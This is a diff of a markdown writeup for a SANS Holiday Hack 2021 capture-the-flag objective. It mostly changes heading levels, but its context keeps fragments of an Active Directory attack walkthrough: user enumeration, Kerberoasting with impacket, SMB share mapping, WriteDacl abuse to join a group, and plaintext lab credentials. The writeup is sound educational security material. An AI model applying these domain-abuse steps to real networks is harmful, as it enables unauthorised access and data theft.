@@ -1,12 +1,12 @@
 # Writeup for SANS Holiday Hack Challenge 2021 – Jack’s Back! featuring KringleCon 4: Calling Birds
-# 8. Kerberoasting on an Open Fire
-## 8.0. Description
+## 8. Kerberoasting on an Open Fire
+### 8.0. Description
 Difficulty: :christmas_tree::christmas_tree::christmas_tree::christmas_tree::christmas_tree:   
 Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the [ElfU Portal](https://register.elfu.org/). Find Eve Snowshoes in Santa's office for hints.
 
-## 8.1. [Side Challenge - HoHo … No](/08.%20Kerberoasting%20on%20an%20Open%20Fire/08.01.%20Side%20Challenge%20-%20HoHo%20…%20No/README.md)
+### 8.1. [Side Challenge - HoHo … No](/08.%20Kerberoasting%20on%20an%20Open%20Fire/08.01.%20Side%20Challenge%20-%20HoHo%20…%20No/README.md)
 
-## 8.2. Hints
+### 8.2. Hints
 **Active Directory Interrogation** - *Eve Snowshoes*: “Investigating Active Directory errors is harder without [Bloodhound](https://github.com/BloodHoundAD/BloodHound), but there are [native methods](https://social.technet.microsoft.com/Forums/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell).”  
 **Stored Credentials** - *Eve Snowshoes*: “Administrators often store credentials in scripts. These can be coopted by an attacker for other purposes!”  
 **CeWL for Wordlist Creation** - *Eve Snowshoes*: “[CeWL](https://github.com/digininja/CeWL) can generate some great wordlists from website, but it will ignore digits in terms by default.”  
@@ -15,8 +15,8 @@ Obtain the secret sleigh research document from a host on the Elf University dom
 **Kerberoasting and Hashcat Syntax** - *Eve Snowshoes*: “Learn about [Kerberoasting](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a) to leverage domain credentials to get usernames and crackable hashes for service accounts.”  
 **Kerberoast and AD Abuse Talk** - *Eve Snowshoes*: “Check out [Chris Davis' talk](https://www.youtube.com/watch?v=iMh8FTzepU4) [and scripts](https://github.com/chrisjd20/hhc21_powershell_snippets) on Kerberoasting and Active Directory permissions abuse.”  
 
-## 8.3. Solution
-### 8.3.0. Escaping the grades application
+### 8.3. Solution
+#### 8.3.0. Escaping the grades application
 The challenge begins by accessing the URL https://register.elfu.org/register and registering a user:  
 ![Registration page](imgs/00_Registration_page.png)  
 ![user creds](imgs/01_user_credentials.png)
@@ -65,7 +65,7 @@ EOFError
 uofwoizocg@grades:~$
 ```
 
-### 8.3.1. First reconnaissance
+#### 8.3.1. First reconnaissance
 Once obtained a shell I started doing some reconnaissance and finding some juicy information:
 ```bash
 uofwoizocg@grades:~$ route -n
@@ -146,7 +146,7 @@ user:[admin] rid:[0x3e8]
 user:[elfu_admin] rid:[0x450]
 user:[elfu_svc] rid:[0x451]
 user:[remote_elf] rid:[0x452]
-# Output removed to shorten report, there were 274 more users
+## Output removed to shorten report, there were 274 more users
 
 rpcclient $> enumdomgroups
 group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
@@ -171,7 +171,7 @@ group:[File Shares] rid:[0x5e7]
 
 As per the ps output, user “rhxgztt+” was trying to open a smbclient connection to “\\SHARE30\elfu_svc_shr” with user “elfu_svc” and password “Snow2021!”.
 
-### 8.3.2. elfu_svc credentials
+#### 8.3.2. elfu_svc credentials
 Knowing that it wouldn’t be a proper challenge if I just went ahead and used those credentials, I at least tried to see where they came from.
 I noticed that the [impacket](https://github.com/SecureAuthCorp/impacket) tools are installed on the machine and went ahead executing GetUserSPNs obtaining a ticket for the elfu_svc user:
 ```bash
@@ -199,7 +199,7 @@ Given the password is “Snow2021!”, the hints about CeWL and hashcat mangling
 
 Finding where the credentials come from was enough for me to just proceed toward the challenge objective, sorry `¯\_(ツ)_/¯`.
 
-### 8.3.3. elfu_svc_shr share
+#### 8.3.3. elfu_svc_shr share
 I copied [smbmap.py](https://github.com/ShawnDEvans/smbmap) onto the grades machine and nudging around with the elfu_svc credentials it was possible to identify the share “elfu_svc_shr”:
 ```bash
 uofwoizocg@grades:~$ python3 smbmap.py -H 10.128.3.30 -u elfu_svc -p 'Snow2021!'
@@ -242,13 +242,13 @@ PS /home/uofwoizocg> Enter-PSSession -Credential $aCred -ComputerName 10.128.1.5
 [10.128.1.53]: PS C:\Users\remote_elf\Documents>
 ```
 
-### 8.3.4. More reconnaissance
+#### 8.3.4. More reconnaissance
 Trying to find an exploitable group as per Chris Davis’ talk, I eventually ended up observing that the “remote_elf” user has WriteDacl permissions on group “Research Department”
 ```
 [10.128.1.53]: PS C:\Users\remote_elf\Documents> $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
 [10.128.1.53]: PS C:\Users\remote_elf\Documents> $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
 [10.128.1.53]: PS C:\Users\remote_elf\Documents> $domainDirEntry.get_ObjectSecurity().Access
-# Output removed to shorten report
+## Output removed to shorten report
 ActiveDirectoryRights : WriteDacl
 InheritanceType       : None
 ObjectType            : 00000000-0000-0000-0000-000000000000
@@ -259,10 +259,10 @@ IdentityReference     : ELFU\remote_elf
 IsInherited           : False
 InheritanceFlags      : None
 PropagationFlags      : None
-# Output removed to shorten report
+## Output removed to shorten report
 ```
 
-### 8.3.5. Adding user to the group
+#### 8.3.5. Adding user to the group
 I then added my user, “uofwoizocg”, to the “Research Department” group using Chris Davis’ method:
 ```powershell
 [10.128.1.53]: PS C:\Users\remote_elf\Documents> Add-Type -AssemblyName System.DirectoryServices
@@ -298,7 +298,7 @@ I then added my user, “uofwoizocg”, to the “Research Department” group u
 [10.128.1.53]: PS C:\Users\remote_elf\Documents> $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
 [10.128.1.53]: PS C:\Users\remote_elf\Documents> $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
 [10.128.1.53]: PS C:\Users\remote_elf\Documents> $domainDirEntry.get_ObjectSecurity().Access
-# Output removed to shorten report
+## Output removed to shorten report
 ActiveDirectoryRights : GenericAll
 InheritanceType       : None
 ObjectType            : 00000000-0000-0000-0000-000000000000
@@ -309,10 +309,10 @@ IdentityReference     : ELFU\uofwoizocg
 IsInherited           : False
 InheritanceFlags      : None
 PropagationFlags      : None
-# Output removed to shorten report
+## Output removed to shorten report
 ```
 
-### 8.3.6. Obtaining the flag
+#### 8.3.6. Obtaining the flag
 Once added the user to the group I was able to access the share “research_dep” and obtain the “SantaSecretToAWonderfulHolidaySeason.pdf” file:
 ```
 uofwoizocg@grades:~$ smbclient \\\\10.128.3.30\\research_dep
@@ -330,48 +330,48 @@ The file is available here: [05_SantaSecretToAWonderfulHolidaySeason.pdf](05_San
 
 The answer to the challenge is: “Kindness”
 
-## 8.4. Kudos!
-### 8.4.0. Escaping the grades app, @DP
+### 8.4. Kudos!
+#### 8.4.0. Escaping the grades app, @DP
 Thank you to @DP for telling me the secret in escaping the grades app:
 “Honestly, you're better of just mashing the keyboard to see what happens or headbutting it (if you're that frustrated)”
-### 8.4.1. The password of remote_elf user, [@matt115](https://github.com/matt115)
+#### 8.4.1. The password of remote_elf user, [@matt115](https://github.com/matt115)
 My friend [@matt115](https://github.com/matt115) was also able to extract the password “A1d655f7f5d98b10!” for user “elfu.local\remote_elf”, but he didn’t tell me how :)
-### 8.4.2. WWDD, @DP
+#### 8.4.2. WWDD, @DP
 Thanks to @DP for making me notice that MAYBE Domain Admins is not alway the target, something like “[BeSanta](https://github.com/LamonatoAndrea/KringleCon3/blob/main/10.%20Defeat%20Fingerprint%20Sensor/README.md#102-because-sometimes-root-is-not-the-way)” :)
 
 
 
 
 ---
-# [2. Where in the World is Caramel Santiaigo?](README.md)
-# [2.1. Side Challenge - Exif Metadata](README.md)
-# [3. Thaw Frost Tower's Entrance](README.md)
-# [3.1. Side Challenge - Grepping for Gold](README.md)
-# [4. Slot Machine Investigation](README.md)
-# [4.1. Side Challenge - Logic Munchers](README.md)
-# [5. Strange USB Device](README.md)
-# [5.1. Side Challenge - IPv6 Sandbox](README.md)
-# [6. Shellcode Primer](README.md)
-# [6.1. Side Challenge - Holiday Hero](README.md)
-# [7. Printer Exploitation](README.md)
-# [7.0. Description](README.md)
-# [8. Kerberoasting on an Open Fire](README.md)
-# [8.1. Side Challenge - HoHo … No](README.md)
-# [9. Splunk!](README.md)
-# [9.1. Side Challenge - Yara Analysis](README.md)
-# [10. Now Hiring!](README.md)
-# [10.1. Side Challenge - IMDS Exploration](README.md)
-# [11. Customer Complaint Analysis](README.md)
-# [11.1. Side Challenge - Strace Ltrace Retrace](README.md)
-# [12. Frost Tower Website Checkup](README.md)
-# [12.1. Side Challenge - The Elf C0de Python Edition](README.md)
-# [13. FPGA Programming](README.md)
-# [13.1. Side Challenge - Frostavator](README.md)
-# [14. Bonus! Blue Log4Jack](README.md)
-# [15. Bonus! Red Log4Jack](README.md)
+## [2. Where in the World is Caramel Santiaigo?](README.md)
+## [2.1. Side Challenge - Exif Metadata](README.md)
+## [3. Thaw Frost Tower's Entrance](README.md)
+## [3.1. Side Challenge - Grepping for Gold](README.md)
+## [4. Slot Machine Investigation](README.md)
+## [4.1. Side Challenge - Logic Munchers](README.md)
+## [5. Strange USB Device](README.md)
+## [5.1. Side Challenge - IPv6 Sandbox](README.md)
+## [6. Shellcode Primer](README.md)
+## [6.1. Side Challenge - Holiday Hero](README.md)
+## [7. Printer Exploitation](README.md)
+## [7.0. Description](README.md)
+## [8. Kerberoasting on an Open Fire](README.md)
+## [8.1. Side Challenge - HoHo … No](README.md)
+## [9. Splunk!](README.md)
+## [9.1. Side Challenge - Yara Analysis](README.md)
+## [10. Now Hiring!](README.md)
+## [10.1. Side Challenge - IMDS Exploration](README.md)
+## [11. Customer Complaint Analysis](README.md)
+## [11.1. Side Challenge - Strace Ltrace Retrace](README.md)
+## [12. Frost Tower Website Checkup](README.md)
+## [12.1. Side Challenge - The Elf C0de Python Edition](README.md)
+## [13. FPGA Programming](README.md)
+## [13.1. Side Challenge - Frostavator](README.md)
+## [14. Bonus! Blue Log4Jack](README.md)
+## [15. Bonus! Red Log4Jack](README.md)
 ---
-# [0. windovo\\thedead> whoami](../README.md)
-# [1. KringleCon Orientation](01.%20KringleCon%20Orientation/README.md)
-# [16. That’s how Jack came from space](../README.md#16-thats-how-jack-came-from-space)
-# [17. Narrative](../README.md#17-narrative)
-# [18. Conclusions](../README.md#18-conclusions)
+## [0. windovo\\thedead> whoami](../README.md)
+## [1. KringleCon Orientation](01.%20KringleCon%20Orientation/README.md)
+## [16. That’s how Jack came from space](../README.md#16-thats-how-jack-came-from-space)
+## [17. Narrative](../README.md#17-narrative)
+## [18. Conclusions](../README.md#18-conclusions)
